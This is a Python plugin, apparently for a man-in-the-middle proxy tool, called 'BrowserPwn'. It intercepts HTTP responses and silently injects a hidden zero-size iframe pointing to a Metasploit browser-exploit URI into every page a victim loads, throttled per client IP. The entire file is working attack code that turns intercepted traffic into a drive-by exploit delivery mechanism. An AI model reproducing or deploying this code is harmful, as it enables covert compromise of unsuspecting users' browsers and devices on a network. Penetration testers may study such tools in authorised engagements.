import os,subprocess,logging,time
from plugins.plugin import Plugin
from MITMUtils import *

class BrowserPwn(Plugin):
    name = "Browser Pwn"
    optname = "browserpwn"
    implements = ["handleResponse"]
    has_opts = True
    log_level = logging.DEBUG
    def initialize(self,options):
        '''Called if plugin is enabled, passed the options namespace'''
        self.options = options
        self.msf_uri = options.msf_uri
        self.ctable = {}
    def handleResponse(self,request,data):
        #We throttle to only inject once every two seconds per client
        #If you have MSF on another host, you may need to check prior to injection
        #print "http://" + request.client.getRequestHostname() + request.uri
        ip = request.client.getClientIP()
        if ip not in self.ctable or time.time()-self.ctable[ip]>2:

            data = insert_html(request.client,data,post=
            [
                ("</body>",'<iframe src=\"%s\" height=0%% width=0%%></iframe>'%(self.msf_uri)),
            ])
            self.ctable[ip] = time.time()
            logging.info("Injected malicious iframe for browser pwnage.")
            return {'request':request,'data':data}
        else:
            return

    def add_options(self,options):
        options.add_argument("--msf-uri",type=str,default="http://127.0.0.1:8080/",
                help="The attack URI given to you by MSF")
